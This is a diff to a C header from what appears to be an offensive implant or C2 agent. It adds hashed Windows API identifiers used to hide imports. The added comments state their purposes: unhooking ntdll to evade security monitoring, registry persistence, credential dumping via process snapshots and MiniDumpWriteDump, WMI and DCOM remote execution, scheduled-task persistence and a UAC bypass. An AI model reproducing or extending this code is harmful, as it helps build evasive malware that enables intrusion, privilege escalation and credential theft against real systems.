@@ -62,6 +62,8 @@
 #define H_FUNC_NTALLOCATEVIRTUALMEMORY               0xf783b8ec
 #define H_FUNC_NTFREEVIRTUALMEMORY                   0x2802c609
 #define H_FUNC_NTUNMAPVIEWOFSECTION                  0x6aa412cd
+#define H_FUNC_NTOPENSECTION                         0x134eda0e  /* HVC-031 Sub-4: ntdll unhook */
+#define H_FUNC_NTMAPVIEWOFSECTION                    0xd6649bca  /* HVC-031 Sub-4: ntdll unhook */
 #define H_FUNC_NTWRITEVIRTUALMEMORY                  0xc3170192
 #define H_FUNC_NTSETINFORMATIONVIRTUALMEMORY         0x946ac239
 #define H_FUNC_NTQUERYVIRTUALMEMORY                  0x10c0e85d
@@ -122,6 +124,9 @@
 #define H_FUNC_RTLCOPYMAPPEDMEMORY                   0x5b56b302
 #define H_FUNC_RTLFILLMEMORY                         0x89ab5f57
 #define H_FUNC_RTLEXITUSERTHREAD                     0x2f6db5e8
+#define H_FUNC_RTLUSERTHREADSTART                    0x0353797c
+#define H_FUNC_LDRLOCKLOADERLOCK                     0xcdcd3c90  /* ISS-002/003: PEB LDR list walk serialisation */
+#define H_FUNC_LDRUNLOCKLOADERLOCK                   0xfc603ed3  /* ISS-002/003: PEB LDR list walk serialisation */
 
 /* [HVC-007 2026-03-28] LZNT1 compression (ntdll.dll). See TrafficImprovements.md §7. */
 #define H_FUNC_RTLGETCOMPRESSIONWORKSPACESIZE        0x3deb55f3
@@ -133,6 +138,7 @@
 #define H_FUNC_LOADLIBRARYW                          0xb7072ff1
 #define H_FUNC_GETCOMPUTERNAMEEXA                    0xec725c53
 #define H_FUNC_WAITFORSINGLEOBJECTEX                 0x512e1b97
+#define H_FUNC_BASETHREADINITTHUNK                   0xe2491896
 #define H_FUNC_VIRTUALPROTECT                        0xe857500d
 #define H_FUNC_GETMODULEHANDLEA                      0xd908e1d8
 #define H_FUNC_GETPROCADDRESS                        0xdecfc1bf
@@ -395,6 +401,29 @@
 #define H_FUNC_REGOPENKEYW                        0x83e34e72   /* RegOpenKeyExW    */
 #define H_FUNC_REGQUERYVALUEEXW                   0xd37cffca   /* RegQueryValueExW */
 #define H_FUNC_REGCLOSEKEY                        0x7649a602   /* RegCloseKey      */
+
+/* [HVC-032] Advapi32 — Registry (persistence, credential access, privilege escalation) */
+#define H_FUNC_REGSETVALUEEXW                     0x2cea05e0   /* RegSetValueExW   */
+#define H_FUNC_REGSAVEKEYEXW                      0xbc55f40f   /* RegSaveKeyExW    */
+#define H_FUNC_REGDELETEVALUEW                    0x7f6bf10a   /* RegDeleteValueW  */
+#define H_FUNC_REGCREATEKEYEXW                    0x0c988e74   /* RegCreateKeyExW  */
+#define H_FUNC_REGDELETETREEW                     0xae6c27fd   /* RegDeleteTreeW   */
+
+/* [HVC-032] Ole32 — COM (WMI exec, DCOM exec, persist schtask) */
+#define H_FUNC_COINITIALIZEEX                     0xa4f90586   /* CoInitializeEx    */
+#define H_FUNC_COCREATEINSTANCE                   0xa2d91380   /* CoCreateInstance  */
+#define H_FUNC_COCREATEINSTANCEEX                 0xbd6bfcbd   /* CoCreateInstanceEx*/
+#define H_FUNC_COUNINITIALIZE                     0xe4716acc   /* CoUninitialize    */
+
+/* [HVC-032] Kernel32 — snapshot / path helpers (credential access, UAC bypass) */
+#define H_FUNC_PSSCAPTURESNAPSHOT                 0x9fc0e5ff   /* PssCaptureSnapshot*/
+#define H_FUNC_PSSFREESNAPSHOT                    0xd2c7ae6d   /* PssFreeSnapshot   */
+#define H_FUNC_GETTEMPPATHW                       0xffd74cff   /* GetTempPathW      */
+#define H_FUNC_MINIWRITEDUMP                      0x78f104c9   /* MiniDumpWriteDump */
+
+/* [HVC-032] Shell32 — UAC bypass launcher */
+#define H_FUNC_SHELLEXECUTEW                      0x70f2d4c7   /* ShellExecuteW     */
+
 
 #define H_MODULE_KERNEL32                         0xadd31df0
 #define H_MODULE_NTDLL                            0x70e61753
